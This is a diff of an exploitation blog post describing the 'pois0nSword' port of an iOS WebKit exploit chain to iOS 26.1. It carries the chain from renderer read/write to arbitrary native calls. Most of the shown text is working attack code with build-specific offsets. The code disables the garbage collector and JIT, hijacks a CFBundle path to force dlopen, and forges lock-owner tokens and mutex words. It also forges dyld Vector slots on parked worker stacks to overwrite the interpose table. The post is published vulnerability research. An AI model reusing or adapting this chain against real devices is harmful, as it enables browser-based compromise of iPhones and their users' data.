@@ -1,34 +1,33 @@
 ---
-authors: [varik]
+authors: [varik, genericcoding]
 date: 2026-07-27
 tags: [PWN, JSC, JavaScriptCore, WebKit, Safari, iOS, dyld, PAC, Browser Exploitation]
-title: 'JSC Exploitation Primitives - Part 2: From Arbitrary R/W to Arbitrary Native Calls'
-summary: "Arbitrary read/write is not code execution. This part walks the road from read64/write64 to a real native call inside the WebContent sandbox on iOS 26.1: disabling the GC, parking a thread inside dlopen, making dyld's own allocator install our interpose table, and the three locks in that path which 26.1 now checks in ways 18.6 did not."
-images: ['/static/images/jsc/og-jsc-primitives-part2.png']
+title: 'pois0nSword: From Renderer R/W to Native Calls on iOS 26.1'
+summary: "Arbitrary read/write is not code execution. This post walks the road from read64/write64 to a real native call inside the WebContent sandbox on iOS 26.1: disabling the GC, parking a thread inside dlopen, making dyld's own allocator install our interpose table, the three locks in that path which 26.1 now checks in ways 18.6 did not - and the default-false embedder preference that silently disables the phone-number trigger on stock hardware."
+images: ['/static/images/jsc/og-pois0nsword-native-calls.png']
 ---
 
-# JSC Exploitation Primitives - Part 2
+# pois0nSword: From Renderer R/W to Native Calls on iOS 26.1
+In [Part 1](https://varik.dev/blog/jsc/jsc-exploitation-primitives-part-1) we climbed a single out-of-bounds write to cage-free `read64`/`write64` inside the renderer. That OOB was planted by hand to keep the focus on the primitives; the real chain begins a step earlier, at the **CVE-2025-43529** use-after-free, whose freed `JSCell` we reclaim with a controlled object to get a type-confusion gadget - and it is that confusion we ride up to the same `read64`/`write64`. This post is the logical Part 2 of that first one - it picks up exactly where Part 1 left off, turning that read/write into an **arbitrary native call** inside the WebContent sandbox.
 
-In [Part 1](https://varik.dev/blog/jsc/jsc-exploitation-primitives-part-1) we took a single out-of-bounds write and climbed it all the way to cage-free `read64`/`write64` inside the renderer. That's the half everybody writes about. This part is the other half: turning that read/write into an **arbitrary native call** inside the WebContent sandbox.
+The road there is [pois0nSword](https://github.com/GenericCoding/pois0nSword) - [@GenericCoding](https://x.com/GenericCoding) started it as a port of the DarkSword chain to iOS 26.1. After the first post went up, GenericCoding reached out and I joined. From there we built it together, starting with exactly the two things Part 1 said were next: **disabling the GC** and the **PAC wall**. This post is our joint writeup of that port - a field report on what moving a chain from 18.6 to 26.1 really costs, where "the same technique" turns out to mean "the same idea, and about six new walls".
 
-After the first post went up, [@GenericCoding](https://x.com/GenericCoding) reached out - he's the main developer of [pois0nSword](https://github.com/GenericCoding/pois0nSword), a port of DarkSword to iOS 26.1 - and after some back and forth I joined the project. It was sitting at exactly the two things Part 1 said were next: **disabling the GC**, and the **PAC bypass**. So this post is partly a technique writeup and partly a field report on porting a working chain from 18.6 up to 26.1, where "the same technique" turns out to mean "the same idea, and about six new walls".
-
-Everything here runs on a research device (`vphone`, iOS 26.1 build 23B85, iPhone17,3-class) against an already-patched bug. Treat every constant as a snapshot of that exact build.
+Everything here runs on a research device (`vphone`, iOS 26.1 build 23B85, iPhone17,3-class) against an already-patched bug. Treat every constant as a snapshot of that exact build. Since the first draft the same build has run the fcall end-to-end on a stock iPhone too; Step 10 covers the one embedder preference that silently disabled the trigger there.
 
 **Jump to a part:**
 
-- [Part 1 - Turning off the GC](#part-1---turning-off-the-gc) - and keeping R/W alive when the heap moves
-- [Part 2 - The PAC wall](#part-2---the-pac-wall) - why you can't just overwrite a vtable anymore
-- [Part 3 - The interpose primitive](#part-3---the-interpose-primitive) - dyld's own allocator does the write for us
-- [Part 4 - Setting up the workers](#part-4---setting-up-the-workers) - you cannot park the thread you're standing on
-- [Part 5 - dlopen on demand](#part-5---dlopen-on-demand) - hijacking the TextToSpeech bundle loader
-- [Part 6 - Parking mid-dlopen](#part-6---parking-mid-dlopen) - `__cxa_atexit` as a tripwire
-- [Part 7 - Three locks](#part-7---three-locks) - what 26.1 hardened, and how each one is beaten
-- [Part 8 - The wake and the write](#part-8---the-wake-and-the-write) - forging a `Vector` on a frozen stack
-- [Part 9 - From table to gadgets](#part-9---from-table-to-gadgets) - making ImageIO resolve our function pointers
-- [Part 10 - slow_fcall](#part-10---slow_fcall) - a phone-number scan that calls anything
+- [Step 1 - Turning off the GC](#step-1---turning-off-the-gc) - and keeping R/W alive when the heap moves
+- [Step 2 - The PAC wall](#step-2---the-pac-wall) - why you can't just overwrite a vtable anymore
+- [Step 3 - The interpose primitive](#step-3---the-interpose-primitive) - dyld's own allocator does the write for us
+- [Step 4 - Setting up the workers](#step-4---setting-up-the-workers) - you cannot park the thread you're standing on
+- [Step 5 - dlopen on demand](#step-5---dlopen-on-demand) - hijacking the TextToSpeech bundle loader
+- [Step 6 - Parking mid-dlopen](#step-6---parking-mid-dlopen) - `__cxa_atexit` as a tripwire
+- [Step 7 - Three locks](#step-7---three-locks) - what 26.1 hardened, and how each one is beaten
+- [Step 8 - The wake and the write](#step-8---the-wake-and-the-write) - forging a `Vector` on a frozen stack
+- [Step 9 - From table to gadgets](#step-9---from-table-to-gadgets) - making ImageIO resolve our function pointers
+- [Step 10 - slow_fcall](#step-10---slow_fcall) - a phone-number scan that calls anything
 
-## Part 1 - Turning off the GC
+## Step 1 - Turning off the GC
 
 This is the direct continuation of where Part 1 stopped. All those fake cells - `changeArr`, the forged `StringImpl`, the hijacked butterflies - are landmines the moment the collector marks one. The blunt fix is to stop the collector entirely by clearing [`JSC::Heap::m_isSafeToCollect`](https://github.com/apple-oss-distributions/JavaScriptCore/blob/JavaScriptCore-7611.3.10.1.3/heap/Heap.h#L654):
 
@@ -85,7 +84,31 @@ if (fn < 0x180000000n || fn >= 0x400000000n) return fail('native ptr not in shar
 
 The fourth check is the important one. The first three only show that the primitives agree with each other, and a broken primitive can still manage that - point `read64` at the wrong place and it will read and write its own garbage quite happily. The fourth one reads a value we already know the shape of from outside the exploit, so it catches a primitive that is confidently returning nonsense.
 
-## Part 2 - The PAC wall
+### And stop the JIT from recompiling under us
+
+While we are freezing the runtime in place, we do the same to the JIT. Right after the slide is applied, stage 2 writes the JIT call-target allowlist:
+
+```javascript
+write64(offsets.JavaScriptCore__jitAllowList_once, 0xffffffffffffffffn) // once = "already initialized"
+write64(offsets.JavaScriptCore__jitAllowList + 8n, 1n)
+```
+
+It is easy to read that name backwards. `jitAllowlist` is not a switch that turns JIT *on* - it is a gate that decides which code blocks may be JIT-compiled at all. Every code block consults it through [`shouldJIT()`](https://github.com/apple-oss-distributions/JavaScriptCore/blob/eef51e0fbf4a4fa75a0e472d2480fa30c278e423/llint/LLIntSlowPaths.cpp#L349):
+
+```cpp
+inline bool shouldJIT(CodeBlock* codeBlock) {
+    if (!Options::bytecodeRangeToJITCompile().isInRange(codeBlock->instructionsSize())
+        || !ensureGlobalJITAllowlist().contains(codeBlock))
+        return false;
+    return Options::useBaselineJIT();
+}
+```
+
+A code block that is **not** in the allowlist gets `shouldJIT() == false`, and the runtime answers with `codeBlock->dontJITAnytimeSoon()` - it stays in the LLInt interpreter, permanently. By marking the allowlist initialized before it ever reads the real file, and leaving it empty, we make `shouldJIT()` return false for **every** code block. The JIT is off, and everything the exploit runs - and everything that runs over our fake cells - stays interpreted, where nothing gets recompiled underneath us.
+
+This matters for the same reason the GC switch matters. Our fake `ArrayBuffer`s, forged butterflies and hijacked objects are all valid *interpreter* state. The JIT is a compiler that rewrites code and, in doing so, re-validates and re-layouts the very structures we are lying about. Keeping JSC on the interpreter is part of making the lie stable.
+
+## Step 2 - The PAC wall
 
 With R/W up, the classic next move is to find a code pointer, overwrite it, and take control. On arm64e that move is dead.
 
@@ -122,7 +145,7 @@ So the two fields we need to change are that vector's buffer pointer and its ele
 
 That is the whole plan. Everything else in this post is the work needed to overwrite those two fields.
 
-## Part 3 - The interpose primitive
+## Step 3 - The interpose primitive
 
 This part is the core trick, so it's worth going slowly.
 
@@ -402,12 +425,12 @@ Now the same code path, with two fields changed while the thread is asleep:
       caption: 'The interpose table is ours. Every symbol dyld resolves from here on reads it.',
       ok: ['rs.buf'],
       detail:
-        'The count field at +0xc0 is filled the same way, by a second Vector in the same epilogue. Part 8 covers both legs.',
+        'The count field at +0xc0 is filled the same way, by a second Vector in the same epilogue. Step 8 covers both legs.',
     },
   ]}
 />
 
-## Part 4 - Setting up the workers
+## Step 4 - Setting up the workers
 
 Freezing a thread inside `dlopen` means that thread stops answering. If that's the thread running our exploit, the exploit is over. So the first structural requirement is other threads.
 
@@ -441,16 +464,17 @@ const dlopen_worker = `(() => {
 
 Two details in there matter more than they look.
 
-`globalThis[0] = data` plants an integer marker (`0x11111111`, `0x22222222`, `0x33333333`) as an indexed property, which means it lands in the worker global's butterfly at a predictable slot. That's how the chain identifies which worker is which - allocation order is not stable, and stage 4 must plant its class into the exact worker the page will later tell to `close()`.
+`globalThis[0] = data` plants an integer marker (`0x11111111`, `0x22222222`, `0x33333333`, `0x44444444` - one per worker, `0x11111111 * i`) as an indexed property, which means it lands in the worker global's butterfly at a predictable slot. That's how the chain identifies which worker is which - allocation order is not stable, and stage 4 must plant its class into the exact worker the page will later tell to `close()`.
 
 `willReadFrequently: true` looks like a performance hint and is actually the difference between the technique working and not, for reasons we'll get to in the next section.
 
-We spawn three:
+We spawn four:
 
 ```javascript
-// [0] = worker1 park, [1] = worker2 park, [2] = SPARE "fire worker" -- its close()
-// runs the AVSpeech gate on ITS thread, so the chain never runs the gate itself.
-for (let i = 1; i <= 3; ++i) {
+// [0] = worker1 park, [1] = worker2 park, [2] = SPARE for worker1's wake fire,
+// [3] = SPARE for worker2's wake fire -- each spare's close() runs the AVSpeech gate
+// on ITS thread, so the chain never runs the gate itself.
+for (let i = 1; i <= 4; ++i) {
   const worker = new Worker(dlopen_worker_url)
   dlopen_workers.push(worker)
   await new Promise((r) => {
@@ -461,7 +485,9 @@ for (let i = 1; i <= 3; ++i) {
 }
 ```
 
-Now the chain has to find those threads _in memory_, because it needs each one's `WTF::Thread` (for its stack bounds, later) and its mach thread port (for the lock work in Part 7). WebCore keeps a process-wide registry of every script execution context, which is exactly the handle we need:
+Two spares, not one, because a spare is single-use: its `ImageBitmap` is consumed by the first `close()`, and a spent spare can never fire again. Each wake gets its own - `0x33333333` for worker1's fire, `0x44444444` for worker2's.
+
+Now the chain has to find those threads _in memory_, because it needs each one's `WTF::Thread` (for its stack bounds, later) and its mach thread port (for the lock work in Step 7). WebCore keeps a process-wide registry of every script execution context, which is exactly the handle we need:
 
 ```javascript
 const contexts = p.read64(offsets.WebCore__allScriptExecutionContextsMap_contexts)
@@ -484,19 +510,31 @@ for (let i = 0n; i < contexts_length; ++i) {
   const tag = id & 0xffffffffn
   if (tag === 0x11111111n || tag === 0x22222222n) {
     p.dlopen_workers.push({ ctx: context, thread, threadPort, id, bitmap })
-  } else if (tag === 0x33333333n) {
-    p.sub_worker = { ctx: context, thread, threadPort, id }
+  } else if (tag === 0x33333333n || tag === 0x44444444n) {
+    // the SPAREs (one per wake fire; see the spawn loop above)
+    ;(p.spare_workers = p.spare_workers || []).push({ ctx: context, thread, threadPort, id })
   }
 }
 p.dlopen_workers.sort((a, b) => Number((a.id & 0xffffffffn) - (b.id & 0xffffffffn)))
+p.spare_workers.sort((a, b) => Number((a.id & 0xffffffffn) - (b.id & 0xffffffffn)))
 ```
 
 Filtering on the `DedicatedWorkerGlobalScope` vtable is what separates workers from documents, and `noPAC` is needed because the vtable pointer itself is signed. The explicit sort at the end exists because the map walk order is not stable across runs, and the page always fires `close()` at `dlopen_workers[0]`.
 
-The token read is two shape-validated 32-bit loads off the `WTF::Thread`:
+The token read is two shape-validated 32-bit loads off the `WTF::Thread`. Only three fields matter, and they sit consecutively ([`Source/WTF/wtf/Threading.h`](https://github.com/WebKit/WebKit/blob/main/Source/WTF/wtf/Threading.h)):
+
+```cpp
+class Thread {                              // ... earlier members omitted
+    PlatformThreadHandle m_handle;          // +0x28   == pthread_t
+    const uint32_t       m_uid;             // +0x30   main thread == 1, workers ++
+    mach_port_t          m_platformThread;  // +0x34   the mach thread port  <- the token
+};
+```
+
+`m_platformThread` is the number Step 7 needs: on 26.1 every lock stores the owning thread's mach port, so this field is the key we cut in advance for each worker.
 
 ```javascript
-// 23B85, empirical:  m_handle +0x28 (== pthread_t),  m_uid u32 +0x30,  port u32 +0x34
+// 23B85:  m_handle +0x28 (== pthread_t),  m_uid u32 +0x30,  port u32 +0x34
 function portFromWtfThread(thread) {
   const uid = BigInt(p.read32(thread + 0x30n))
   const port = BigInt(p.read32(thread + 0x34n))
@@ -512,9 +550,9 @@ function portFromWtfThread(thread) {
 }
 ```
 
-Hold onto that port value. In Part 7 it becomes the most important number in the chain.
+Hold onto that port value. In Step 7 it becomes the most important number in the chain.
 
-## Part 5 - dlopen on demand
+## Step 5 - dlopen on demand
 
 We need the process to `dlopen` a path of our choosing, on a thread of our choosing. There's no `dlopen()` in JavaScript, so we borrow one.
 
@@ -581,13 +619,24 @@ p.rearmCFBundleLoader = (cstringOffset, cstringSize) => {
     TextToSpeech_CFBundle + structs.CFBundle_execPath,
     offsets.CFNetwork__gConstantCFStringValueTable
   )
-  atexitHold() // arm the trap the loaded dylib will fall into (Part 6)
+  atexitHold() // arm the trap the loaded dylib will fall into (Step 6)
 }
 ```
 
+Those writes land on two fields of the `CFBundle` (`struct __CFBundle` in CoreFoundation's `CFBundle_Internal.h`), plus the executable-path field it caches:
+
+```c
+struct __CFBundle {                     // ... other members omitted
+    Boolean     _isLoaded;              // +0x34   CFBundle_loadedFlag
+    CFStringRef _executablePath;        // +0x68   CFBundle_execPath (calculated & cached here)
+};
+```
+
+`_executablePath` being **cached** is the whole opening: CoreFoundation resolves the path once and reuses it, so overwriting this field redirects the `dlopen` without CF ever recomputing it from the bundle URL.
+
 Three lies, told in order:
 
-1. **Clear both loaded flags.** `-[NSBundle isLoaded]` checks bit 26 of the `NSBundle` flags, and falls back to a byte in the `CFBundle`. Clearing both makes CoreFoundation believe an already-loaded framework was unloaded, so it is willing to load it again.
+1. **Clear both loaded flags.** `-[NSBundle isLoaded]` checks bit 26 of the `NSBundle` flags, and falls back to `CFBundle._isLoaded` (the byte at `+0x34`). Clearing both makes CoreFoundation believe an already-loaded framework was unloaded, so it is willing to load it again.
 2. **Zero the `dispatch_once` token.** The deferred loader is meant to run once per process. Zeroing the token makes "once" mean "again, now".
 3. **Repoint the executable path.** We cannot write to a constant `CFString` - those live in read-only `__AUTH_CONST`, and we proved that the hard way by faulting on one and corrupting our own R/W in the process. What _is_ writable is `gConstantCFStringValueTable`, a mutable CFString in CFNetwork's data segment. So we overwrite that string's character pointer and length, and point the bundle's `execPath` at it. Now the loader `dlopen`s whatever we want.
 
@@ -613,7 +662,7 @@ p.makeCString = (str) => {
 
 Deterministic for any length, no dependence on string representation. This is a good example of the general shape of this port: the technique was fine, an assumption underneath it had quietly stopped being true.
 
-## Part 6 - Parking mid-dlopen
+## Step 6 - Parking mid-dlopen
 
 We need the loading thread to stop at a very specific moment: **after** dyld has built the stack frame with the Vector on it, but **before** the code at the end of `dlopen` cleans that frame up. Too early and the Vector isn't there yet. Too late and it's already been freed.
 
@@ -625,15 +674,27 @@ That is the whole idea. Making it work took much longer, because of how the mute
 
 ### The mutex word is two counters, not a flag
 
-DarkSword writes `0x101` here, meaning "unlocked, but there is a waiter". On 18.6 that works. On 26.1 the same value kills an unrelated thread. Understanding why meant reading libpthread:
+DarkSword writes `0x101` here, meaning "unlocked, but there is a waiter". On 18.6 that works. On 26.1 the same value kills an unrelated thread. Understanding why meant reading libpthread. The 64-bit word at `+0x20` is not a flag - it is [`mutex_seq`](https://github.com/apple-oss-distributions/libpthread/blob/main/src/pthread_mutex.c), a union of two 32-bit counters:
+
+```c
+typedef union mutex_seq {
+    uint32_t seq[2];
+    struct { uint32_t lgenval; uint32_t ugenval; };   // lock-gen / unlock-gen
+    struct { uint32_t mgen;    uint32_t ugen; };       // same two words, "m"/"u" naming
+    uint64_t seq_LU;
+    uint64_t _Atomic atomic_seq_LU;
+} mutex_seq;
+```
+
+`lgenval` (low half) is the **lock generation** - the chain's "waiter count"; `ugenval` (high half) is the **unlock generation** - the "wake generation". Mapping the union onto what the disassembly showed:
 
 ```
 word @ atexit mutex + 0x20  (23B85, NORMAL flavor)
 
   bit0  (0x01)         kernel-ulock-allocated flag
   bit1  (0x02)         HELD
-  low-half  bits 8-31  waiter count      (+0x100 per registered waiter)
-  high-half bits 8-31  wake generation   (+0x100 per drop)
+  low-half  bits 8-31  waiter count      = lgenval, +0x100 per registered waiter
+  high-half bits 8-31  wake generation   = ugenval, +0x100 per drop
 
 pthread_mutex_unlock fast path (0x1df14da44):
     if ((low & 0xffffff00) == (high & 0xffffff00))  -> clear HELD, NO kernel call
@@ -803,7 +864,7 @@ Searching for the low 5 bytes of a signed pointer is a small trick worth stealin
   ]}
 />
 
-## Part 7 - Three locks
+## Step 7 - Three locks
 
 Once worker1 is frozen, editing its stack is easy. Waking it up again is not, and this is where most of the porting time went.
 
@@ -838,7 +899,7 @@ Worth recording the mistake right next to it. The actual lock lives at `+0x20`, 
 
 worker1 parked _inside_ that function, so as far as the lock is concerned worker1 is the owner. If the thread doing our wake also loads through TextToSpeech, it takes the same lock, and one of the two unlocks comes from the wrong thread. Crash again.
 
-Here the fix comes from what the lock stores. On 26.1 an `os_unfair_lock` holds the **mach thread port** of whichever thread owns it (the bottom bits are used as flags). So the ownership check is comparing against a plain number - and we collected exactly those numbers for every worker back in Part 4. A number we can read is a number we can write:
+Here the fix comes from what the lock stores. On 26.1 an `os_unfair_lock` holds the **mach thread port** of whichever thread owns it (the bottom bits are used as flags). So the ownership check is comparing against a plain number - and we collected exactly those numbers for every worker back in Step 4. A number we can read is a number we can write:
 
 ```javascript
 const w1tok = BigInt(worker.threadPort)
@@ -912,33 +973,151 @@ The fix has the same shape as the bundle lock: write the port of whichever threa
 seedTokenVerify(BigInt(tok) & ~3n, 'ARM w1tok')
 ```
 
-This is also why we spawn a **third, spare worker** and let it run the `dispatch_once` block instead of running it on the chain thread. That leaves only two blocks whose completion we have to account for - worker1's and the spare's - and we know where both of them are in the sequence, so we can write the right port before each one can finish.
+This is also why we spawn **spare workers** and let them run the `dispatch_once` block instead of running it on the chain thread. Each wake fire uses its own spare (`0x33333333` for worker1, `0x44444444` for worker2), so the blocks whose completion we have to account for are the two parked workers' gates plus each spare's own early-return - and we seed the right port into the token before each one can finish.
 
-## Part 8 - The wake and the write
+## Step 8 - The wake and the write
 
-Now we can assemble the whole thing. Before waking worker1, we forge the `Vector` on its frozen stack.
+Now we can assemble the whole thing. We have two parked workers and two fields to land: the interpose table needs a buffer pointer _and_ a count, and each parked worker's `dlopen_from` epilogue hands us exactly **one** write. So we park two workers and wake them one at a time - worker1 for the buffer at `RS+0xb8`, worker2 for the count at `RS+0xc0`.
 
-Finding the frame is a stack scan for a return address inside dyld's `dlopen_from`, using the same low-bytes-of-a-signed-pointer trick as the park check. Once we have that address we know where the frame is, and the two slots the cleanup code at the end of `dlopen` will actually free sit at fixed offsets from it:
+### The wake: fireWorkerWake
+
+Waking a parked worker means getting some other thread to perform a real `__cxa_atexit` release while the mutex advertises `count > gen`. The chain does this with the same `NSMapTable` trick that decoupled Lock 2 in Step 7, wrapped in a single entry point:
 
 ```javascript
-// The epilogue's two resize(0) calls (0x180153bd0 / 0x180153bec, both guarded on
-// begin != 0) consume x19+0x70 and x19+0x90 ONLY. needle = saved lr at x19+0x888.
+async function fireWorkerWake(path, tok) {
+  // swap the TextToSpeech slot to a borrowed bundle, plant a fresh AVSpeech class
+  // on a spare worker's bitmap, fire that spare -> it dlopens `path` for us
+  return await wakeViaMapRedirect(path, tok)
+}
+```
+
+The fire does five things in order. First we swap the `TextToSpeech` entry in `_resolvedPathToBundles` so it resolves to the borrowed bundle instead of the real one - the same map swap that kept `TT._lock` out of the wake thread's hands in Step 7. Then we re-arm the borrowed bundle's `CFBundle`: its `execPath` now points at our forged `CFString`, and its loaded-flags are cleared so CoreFoundation will load it again. Then we plant a **fresh** `AVSpeechSynthesis*` class on a **spare worker's** bitmap. The page closes that bitmap, the spare's `+initialize` runs the AVLoadSpeech loader, and the loader `dlopen`s the wake path through the borrowed bundle. The path's static C++ destructors register through `__cxa_atexit`; that release is the drop that wakes the parked worker. Its `dlopen_from` epilogue then runs, and its one `free()` writes the field we forged.
+
+Why a fresh class and a fresh spare, every time. `+initialize` runs once per class ever, and a spare's `ImageBitmap` is consumed by its first `close()`. A spent spare can never re-fire. So each wake draws a fresh class out of the AVSpeech pool and its own spare worker - `0x33333333` for worker1's fire, `0x44444444` for worker2's.
+
+<ArchAnim
+  title="fireWorkerWake: the mapredir fire that wakes a parked worker"
+  speed={3200}
+  panels={[
+    {
+      id: 'chain',
+      label: 'chain worker',
+      sub: 'has read64 / write64',
+      tone: 'proc',
+      span: 3,
+      rows: [{ id: 'act', k: 'doing', v: 'idle' }],
+    },
+    {
+      id: 'map',
+      label: '_resolvedPathToBundles',
+      sub: 'NSMapTable',
+      tone: 'lock',
+      span: 4,
+      rows: [{ id: 'slot', k: 'TextToSpeech ->', v: 'TT' }],
+    },
+    {
+      id: 'spare',
+      label: 'spare worker',
+      sub: 'fresh bitmap + fresh class',
+      tone: 'proc',
+      span: 3,
+      rows: [{ id: 'act', k: 'doing', v: 'idle' }],
+    },
+    {
+      id: 'wN',
+      label: 'parked worker',
+      sub: 'the one being woken',
+      tone: 'proc',
+      span: 3,
+      rows: [{ id: 'act', k: 'doing', v: 'parked' }],
+    },
+    {
+      id: 'lock',
+      label: '__cxa_atexit mutex',
+      tone: 'lock',
+      span: 4,
+      rows: [{ id: 'word', k: 'state', v: 'armed' }],
+    },
+    {
+      id: 'rs',
+      label: 'RuntimeState (RS)',
+      tone: 'dyld',
+      span: 5,
+      rows: [
+        { id: 'buf', k: '+0xb8 tuples buffer', v: 'dyld internal' },
+        { id: 'cnt', k: '+0xc0 tuples count', v: '0x9' },
+      ],
+    },
+  ]}
+  frames={[
+    {
+      caption: 'The chain swaps the TextToSpeech slot so it resolves to a borrowed bundle.',
+      danger: ['map.slot'],
+      values: { 'map.slot': 'TextToSpeech -> borrow' },
+    },
+    {
+      caption: 'It re-arms the borrowed CFBundle and plants a fresh AVSpeech class on the spare.',
+      active: ['chain.act'],
+      values: { 'chain.act': 'forge execPath + plant class' },
+    },
+    {
+      caption: 'The page closes the spare bitmap. +initialize runs the AVLoadSpeech loader on the spare.',
+      active: ['spare.act'],
+      link: { from: 'chain.act', to: 'spare.act', label: 'close()' },
+      values: { 'spare.act': '+initialize -> dlopen(path)' },
+    },
+    {
+      caption: 'The loader dlopens the wake path through the borrowed bundle; its static C++ destructors register through __cxa_atexit.',
+      active: ['spare.act', 'lock.word'],
+      danger: ['lock.word'],
+      values: { 'lock.word': 'count > gen (armed)' },
+    },
+    {
+      caption: 'That release is the drop. The parked worker wakes.',
+      active: ['wN.act'],
+      ok: ['wN.act'],
+      link: { from: 'spare.act', to: 'wN.act', label: 'release -> wake', tone: 'danger' },
+      values: { 'wN.act': 'woken' },
+    },
+    {
+      caption: 'The woken worker finishes its dlopen. Its epilogue free() writes the forged leg.',
+      active: ['wN.act'],
+      ok: ['rs.buf', 'rs.cnt'],
+      values: { 'wN.act': 'cleanup -> free()', 'rs.buf': 'OUR TUPLES (worker1)', 'rs.cnt': '0x109 (worker2)' },
+      detail: 'One parked worker, one write. worker1 takes +0xb8, worker2 takes +0xc0.',
+    },
+  ]}
+/>
+
+### worker1's leg: the buffer
+
+Finding the frame is a stack scan for a return address inside dyld's `dlopen_from`, using the same low-bytes-of-a-signed-pointer trick as the park check. Once we have that address we know where the frame is, and the one vector slot the cleanup code at the end of `dlopen` actually frees sits at a fixed offset from it:
+
+```javascript
+// The epilogue's cleanup free() consumes x19+0x70 ONLY (needle = saved lr at x19+0x888).
 const vecSlot = search_result - 0x818n // = x19+0x70
 
-// BUFFER LEG -> RS+0xb8
+// worker1's leg -> BUFFER, RS+0xb8
 p.write64(vecSlot, p_InterposeTupleAll_buffer - 0x10n) // .allocator = dest - 0x10
 p.write64(vecSlot + 8n, metadata_data_ptr + 0x10n) // .begin = forged metadata
 p.write64(vecSlot + 0x10n, 0n) // .size = 0 -> the copy step is a no-op
-
-// SIZE LEG -> RS+0xc0
-p.write64(vecSlot + 0x20n, p_InterposeTupleAll_size - 0x10n)
-p.write64(vecSlot + 0x28n, metadata2_data_ptr + 0x10n)
-p.write64(vecSlot + 0x30n, 0n)
 ```
 
-There are two of them because the interpose table needs a buffer pointer _and_ a count, and that cleanup code happens to free two vectors. `_allocatedBytes` sits at `allocator + 0x10`, so setting `.allocator = dest - 0x10` puts the write exactly on the field we want.
+### worker2's leg: the count
 
-Worth noting how DarkSword did this, because it is a nice example of a frame giving you more than you expect. Each parked thread hands you one `dlopen` to hijack, so DarkSword used one parked thread per field: one for the buffer pointer, another for the count. Here both fields are armed on the same frame, because that one cleanup path frees two vectors.
+The count at `RS+0xc0` cannot come from the same frame - worker1's epilogue only frees its own one vector, and once worker1 is woken its frame is gone. So we park a second worker and repeat the whole dance. On worker2's frozen frame we forge the same slot, aimed at the count instead:
+
+```javascript
+// worker2's leg -> COUNT, RS+0xc0 (same slot, on worker2's frame)
+const vecSlot2 = search_result2 - 0x818n // = worker2's x19+0x70
+p.write64(vecSlot2, p_InterposeTupleAll_size - 0x10n) // .allocator = dest - 0x10
+p.write64(vecSlot2 + 8n, metadata2_data_ptr + 0x10n) // .begin = forged metadata
+p.write64(vecSlot2 + 0x10n, 0n) // .size = 0 -> the copy step is a no-op
+```
+
+`_allocatedBytes` sits at `allocator + 0x10`, so setting `.allocator = dest - 0x10` puts the write exactly on the field we want - once for worker1's buffer, once for worker2's count.
+
+Worth noting how DarkSword did this. Each parked thread hands you one `dlopen` to hijack, so DarkSword used one parked thread per field: one for the buffer pointer, another for the count. We do exactly the same - the only difference is that in our build each parked worker's epilogue frees one vector, so the two writes genuinely need two parked workers.
 
 An earlier version wrote to a different slot on the same frame and gave us the most confusing result of the whole project: worker1 woke up, unlocked cleanly, and stored nothing at all. That slot simply never gets freed. If something like this appears to work but has no effect, check that the code you are relying on really does read the field you edited.
 
@@ -991,7 +1170,7 @@ p.write64(metadata_addr + 8n, metadata1_size) // size field
 
 The allocator is never confused by any of this. It runs its normal algorithm and gets the normal answer - the header it is reading just happens to be one we wrote. The single step we cannot aim is turned off instead of redirected.
 
-Then we wake worker1 by making some other thread perform a real `__cxa_atexit` release while the mutex advertises `count > gen`. And this is where a detail bit us that we haven't seen written down anywhere: **loading a fresh framework is not sufficient**.
+The fire is only as good as its vehicle, and this is where a detail bit us that we haven't seen written down anywhere: **loading a fresh framework is not sufficient**.
 
 `__cxa_atexit` is only called by images that construct objects with **static storage duration**. A framework whose initializers are pure Objective-C or plain C loads perfectly, bumps dyld's image count, and registers nothing - so there's no release, no drop, and nobody wakes. We watched `Proximity.framework` load successfully and produce zero wakes, repeatedly, before working out why:
 
@@ -1001,22 +1180,25 @@ Then we wake worker1 by making some other thread perform a real `__cxa_atexit` r
 //   Proximity (1-2 inits): loaded 1100->1101 but GEN TIMEOUT every attempt.
 //                          ObjC/C-only inits -> no cxa registration -> no drop.
 //   TextInput bundles:     resource-only, no executable at all.
-//   MacinTalk:             already resident via worker1's own load.
-//   XOJIT:                 ~71 real cxa registrations, not resident. This one.
+//   MacinTalk:             3 ObjC-only inits, loads fresh but registers nothing.
+//   XOJIT:                 ~71 real cxa registrations, not resident. worker1's fire.
+//   HomeUI:                fresh, never resident. worker2's fire.
 const W1_WAKE_PATH = '/System/Library/PrivateFrameworks/XOJIT.framework/XOJIT'
+const W2_WAKE_PATH = '/System/Library/PrivateFrameworks/HomeUI.framework/HomeUI'
 ```
 
-The selection criterion for a wake vehicle is a C++ property of the target binary. That's a strange thing to have to care about, and it's the kind of detail that only shows up when you instrument the thing you assumed was working.
+The selection criterion for a wake vehicle is a C++ property of the target binary. That's a strange thing to have to care about, and it's the kind of detail that only shows up when you instrument the thing you assumed was working. The two fires can even use different vehicles - worker1 fires XOJIT for the buffer, worker2 fires HomeUI for the count - as long as each one is fresh and registers real destructors.
 
 <StepAnim
-  title="The wake, and dyld writing our interpose table"
+  title="Two wakes, two writes: worker1 lands the buffer, worker2 lands the count"
   layout="col"
   speed={2600}
   boxes={[
-    { id: 'v1', label: 'x19+0x70  (Vector #1)', sub: 'buffer leg' },
-    { id: 'v2', label: 'x19+0x90  (Vector #2)', sub: 'size leg' },
+    { id: 'v1', label: 'worker1 x19+0x70', sub: 'buffer leg' },
+    { id: 'v2', label: 'worker2 x19+0x70', sub: 'count leg' },
     { id: 'word', label: 'atexit mutex word', sub: 'count vs generation' },
-    { id: 'spare', label: 'spare worker', sub: 'runs the once-gate + fresh load' },
+    { id: 'spare1', label: 'spare 1 (0x33333333)', sub: 'fires XOJIT' },
+    { id: 'spare2', label: 'spare 2 (0x44444444)', sub: 'fires HomeUI' },
     { id: 'buf', label: 'RuntimeState +0xb8', sub: 'interposingTuplesAll buffer' },
     { id: 'size', label: 'RuntimeState +0xc0', sub: 'interposingTuplesAll count' },
   ]}
@@ -1032,7 +1214,7 @@ The selection criterion for a wake vehicle is a C++ property of the target binar
       },
     },
     {
-      caption: 'Forge Vector #1 on the frozen stack: aim _allocatedBytes at RS+0xb8.',
+      caption: 'Forge worker1\'s Vector on its frozen stack: aim _allocatedBytes at RS+0xb8.',
       danger: ['v1'],
       values: {
         v1: '.allocator = RS+0xb8-0x10',
@@ -1043,60 +1225,46 @@ The selection criterion for a wake vehicle is a C++ property of the target binar
       },
     },
     {
-      caption: 'Forge Vector #2 the same way, aimed at the count field.',
-      danger: ['v1', 'v2'],
+      caption: 'Fire spare 1: plant a fresh class, close its bitmap, load XOJIT through the borrow.',
+      active: ['spare1'],
       values: {
